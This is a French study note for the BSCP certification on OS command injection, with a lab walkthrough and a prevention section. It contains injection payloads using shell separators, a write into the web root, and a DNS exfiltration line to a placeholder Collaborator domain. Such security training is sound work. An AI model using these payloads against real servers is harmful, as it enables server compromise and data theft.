---
tags: [bscp, server-side, command-injection]
niveau: practitioner
statut: en cours
---
# OS command injection

## En bref
- Elle permet à un attaquant d'exécuter des commandes du système d'exploitation sur le serveur qui fait tourner l'application.
- Elle permet généralement de compromettre l'application entière et ses données.
- Par extension, l'attaquant peut souvent s'en servir pour compromettre d'autres parties de l'infrastructure d'hébergement, ou pour attaquer d'autres systèmes en s'appuyant sur les relations de confiance.
- Cause : une valeur contrôlée par l'utilisateur est insérée dans une commande shell sans validation ni échappement.

## Commandes utiles
| Objectif                     | Linux         | Windows         |
| ---------------------------- | ------------- | --------------- |
| Nom de l'utilisateur courant | `whoami`      | `whoami`        |
| Système d'exploitation       | `uname -a`    | `ver`           |
| Configuration réseau         | `ifconfig`    | `ipconfig /all` |
| Connexions réseau            | `netstat -an` | `netstat -an`   |
| Processus en cours           | `ps -ef`      | `tasklist`      |
- Ces commandes servent à la reconnaissance une fois l'injection confirmée : identifier le compte sous lequel tourne l'application, le système, le réseau...
- Sur Linux, `ifconfig` peut être absent des systèmes récents. `ip a` est alors l'équivalent.

## Types et variantes
| Type | Idée clé | Niveau |
| --- | --- | --- |
| Injection avec sortie visible | la sortie de la commande injectée apparaît dans la réponse HTTP | Apprentice |
| Injection aveugle (*blind*) | la sortie n'est pas renvoyée : on prouve l'exécution par un délai, un fichier ou une interaction réseau | Practitioner |

## Comment détecter
- Repérer les fonctionnalités qui s'appuient sur un programme système : vérification de stock, ping ou traceroute, conversion de fichier, envoi d'e-mail, génération de PDF.
- Tester chaque paramètre (y compris les en-têtes et les cookies) avec un séparateur suivi d'une commande inoffensive.
- **Sortie visible** : `& echo aiwefwlguh &` ou `|whoami`. Si la chaîne ou le résultat apparaît dans la réponse, l'injection est confirmée.
- **Aveugle, par délai** : injecter une commande qui fait attendre le serveur, par exemple `& ping -c 10 127.0.0.1 &`. Un temps de réponse d'environ 10 secondes confirme l'injection.
- **Aveugle, par interaction réseau** (*out-of-band*) : injecter une résolution DNS vers un domaine que l'on contrôle, par exemple `& nslookup xxxxx.oastify.com &` (Burp Collaborator). Une requête reçue côté Collaborator confirme l'injection.

## Comment exploiter (principe)
### Séparateurs de commandes
| Séparateur | Linux | Windows | Effet |
| --- | --- | --- | --- |
| `&` | oui | oui | enchaîne sans condition |
| `&&` | oui | oui | exécute la suivante si la précédente réussit |
| `\|` | oui | oui | envoie la sortie de la première à la seconde |
| `\|\|` | oui | oui | exécute la suivante si la précédente échoue |
| `;` | oui | non | séparateur Unix |
| saut de ligne (`%0a` dans une URL) | oui | non | séparateur Unix |
- Sur Unix, on peut aussi insérer la commande injectée avec des guillemets inversés (`` `commande` ``) ou la syntaxe `$(commande)`. Le shell remplace alors l'expression par la sortie de la commande.
- Selon le contexte, l'injection peut tomber à l'intérieur d'une chaîne entre guillemets dans la commande d'origine. Il faut alors fermer le guillemet (`"` ou `'`) avant le séparateur.

### Injection de commande
- Une application permet de vérifier si un article est en stock dans un magasin donné, via l'URL `https://insecure-website.com/stockStatus?productID=381&storeID=29`.
- Pour fournir ces informations, elle interroge des systèmes hérités.
- La fonctionnalité appelle une commande shell avec les identifiants du produit et du magasin en arguments : `stockreport.pl 381 29`.
- La commande affiche l'état des stocks de l'article.
- Les valeurs des paramètres `productID` et `storeID` sont insérées directement dans une commande shell. C'est ce qui rend l'injection possible si ces valeurs ne sont pas filtrées.
- L'application n'a aucune protection contre l'injection de commandes : l'attaquant peut envoyer `& echo aiwefwlguh &` dans le paramètre `productID`.
- La commande exécutée devient : `stockreport.pl & echo aiwefwlguh & 29`.

**Principe de l'attaque**
- `echo` affiche la chaîne fournie dans la sortie : c'est un moyen utile de tester certains types d'injection de commandes.
- Le caractère `&` est un séparateur de commandes du shell. Ici, il provoque l'exécution de trois commandes distinctes, l'une après l'autre.

**Lecture de la sortie**
- `Erreur - productID n'a pas été fourni` : la commande `stockreport.pl` d'origine a été exécutée sans ses arguments, d'où l'erreur.
- `aiwefwlguh` : la commande `echo` injectée a été exécutée et la chaîne s'affiche dans la sortie.
- `29 : commande introuvable` : l'argument d'origine `29` a été exécuté comme une commande, ce qui a provoqué une erreur.

**Bonne pratique**
- Placer un second `&` après la commande injectée la sépare de tout ce qui suit le point d'injection.

### Injection aveugle
- L'application n'affiche pas la sortie de la commande dans sa réponse : les techniques à sortie visible ne suffisent plus.
- **Délai** : mesurer le temps de réponse pour confirmer l'exécution (`ping -c 10 127.0.0.1` sous Linux, `ping -n 10 127.0.0.1` sous Windows).
- **Redirection de la sortie** : écrire le résultat dans un fichier du répertoire web, puis le lire par une requête normale. Exemple : `& whoami > /var/www/static/whoami.txt &`, puis `GET /whoami.txt`. Cela suppose de connaître un répertoire où l'on peut écrire et que le serveur sert.
- **Out-of-band** : déclencher une interaction réseau vers un domaine que l'on contrôle. Exemple : `& nslookup xxxxx.oastify.com &`.
- **Exfiltration out-of-band** : placer la sortie d'une commande dans le sous-domaine de la requête DNS. Exemple : ``& nslookup `whoami`.xxxxx.oastify.com &``. Le nom d'utilisateur apparaît dans la requête reçue par Collaborator.

## Pièges et points d'attention BSCP
- Tester plusieurs séparateurs : un filtre peut en bloquer un (`;` par exemple) et laisser passer les autres (`|`, saut de ligne).
- Encoder les caractères dans l'URL : `&` en `%26`, `;` en `%3b`, le saut de ligne en `%0a`, l'espace en `+` ou `%20`. Un `&` non encodé dans une requête GET est lu comme le début d'un nouveau paramètre. Dans un corps de requête ou un cookie, la règle d'encodage dépend du format.
- Une erreur de type `commande introuvable` après le point d'injection montre que l'injection fonctionne : c'est la suite de la commande d'origine qui échoue.
- Pas de sortie visible ne veut pas dire pas d'injection : passer à la détection par délai avant de conclure.
- Le champ vulnérable n'est pas toujours évident : tester aussi les en-têtes (`User-Agent`, `Referer`, `X-Forwarded-For`) et les cookies.

## Prévention
- Le plus efficace : ne jamais appeler de commande système depuis le code de l'application. Utiliser les API du langage ou des bibliothèques pour la même fonctionnalité.
- Si l'appel est inévitable : valider l'entrée par liste blanche (valeurs autorisées, ou uniquement des caractères alphanumériques) et ne pas compter sur l'échappement des métacaractères du shell, qui est trop fragile.
- Passer les arguments sous forme de liste à une API qui n'invoque pas de shell, plutôt que de construire une chaîne de commande.
- Exécuter l'application avec un compte aux privilèges minimaux.

## Labs PortSwigger
- [x] Apprentice ✅ 2026-10-19
- [ ] Practitioner
- [ ] Expert
## Journal des labs
### Lab 1 - Injection de commande, cas simple
*OS command injection, simple case* - Apprentice

Ce lab contient une vulnérabilité d'injection de commande dans la fonction de vérification des stocks. L'application exécute une commande shell contenant les identifiants de produit et de magasin fournis par l'utilisateur, et renvoie dans sa réponse la sortie brute de la commande.
Pour le résoudre, exécutez la commande `whoami` afin de déterminer le nom de l'utilisateur courant.

1. Avec Burp Suite, interceptez et modifiez une requête qui vérifie le niveau de stock.
2. Modifiez le paramètre `storeID` en lui donnant la valeur `1|whoami`.
3. Observez que la réponse contient le nom de l'utilisateur courant.

### Autres labs de la catégorie (non traités)
- *Blind OS command injection with time delays* - Practitioner
- *Blind OS command injection with output redirection* - Practitioner
- *Blind OS command injection with out-of-band interaction* - Practitioner
- *Blind OS command injection with out-of-band data exfiltration* - Practitioner

## Mes notes
- 

## Liens
- [[SSRF]]
- [[Path-traversal]]
- [[Information-disclosure]]
- [[File-upload-web-shell]]
- [[Payloads-cheatsheet]]
